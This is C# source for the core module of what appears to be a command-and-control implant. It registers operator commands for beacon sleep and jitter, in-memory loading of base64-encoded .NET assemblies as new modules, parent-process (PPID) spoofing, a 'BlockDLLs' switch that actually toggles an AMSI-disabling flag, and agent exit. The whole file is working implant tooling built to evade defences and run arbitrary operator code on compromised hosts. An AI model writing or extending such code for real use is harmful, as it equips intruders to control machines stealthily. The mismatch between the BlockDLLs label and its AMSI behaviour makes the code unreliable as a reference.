using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;

namespace Agent.Modules
{
    public class CoreModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Core",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Sleep",
                        Delegate = SetSleep
                    },
                    new ModuleInfo.Command
                    {
                        Name = "LoadModule",
                        Delegate = LoadAgentModule
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PPID",
                        Delegate = SetPPID
                    },
                    new ModuleInfo.Command
                    {
                        Name = "BlockDLLs",
                        Delegate = SetBlockDLLs
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Exit",
                        Delegate = ExitAgent
                    }
                }
            };
        }

        void LoadAgentModule(string AgentID, AgentTask Task)
        {
            try
            {
                var bytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);

                var currentDomain = AppDomain.CurrentDomain;
                currentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);

                var asm = currentDomain.Load(bytes);
                var instance = asm.CreateInstance("Agent.Module", true);

                if (instance is IAgentModule)
                {
                    var module = instance as IAgentModule;
                    Agent.RegisterAgentModule(module);

                    var info = module.GetModuleInfo();
                    Agent.SendMessage(string.Format("Registered module: {0}", info.Name));
                }
                else
                {
                    Agent.SendError("Assembly does not implement IAgentModule");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SetSleep(string AgentID, AgentTask Task)
        {
            try
            {
                var interval = Task.Parameters["Interval"];
                var jitter = Task.Parameters["Jitter"];

                if (interval != null)
                {
                    Config.Set(AgentConfig.SleepInterval, (int)interval);
                }

                if (jitter != null)
                {
                    Config.Set(AgentConfig.SleepJitter, (int)jitter);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SetPPID(string AgentID, AgentTask Task)
        {
            try
            {
                var ppid = Task.Parameters["PPID"];

                Process process;

                if (ppid == null)
                {
                    process = Process.GetCurrentProcess();
                }
                else
                {
                    process = Process.GetProcessById((int)ppid);
                }

                Config.Set(AgentConfig.PPID, process.Id);

                Agent.SendMessage($"Using PID {process.Id} ({process.ProcessName}) as parent process.");
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SetBlockDLLs(string AgentID, AgentTask Task)
        {
            try
            {
                var block = Task.Parameters["BlockDLLs"];

                bool current;

                if (block == null)
                {
                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
                }
                else
                {
                    if ((bool)block)
                    {
                        Config.Set(AgentConfig.DisableAMSI, true);
                    }
                    else
                    {
                        Config.Set(AgentConfig.DisableAMSI, false);
                    }

                    current = Config.Get<bool>(AgentConfig.DisableAMSI);
                }

                if (current)
                {
                    Agent.SendMessage($"BlockDLLs is enabled.");
                }
                else
                {
                    Agent.SendMessage($"BlockDLLs is disabled.");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExitAgent(string AgentID, AgentTask Task)
        {
            Agent.Stop();
        }

        Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
        {
            return Assembly.GetExecutingAssembly();
        }
    }
}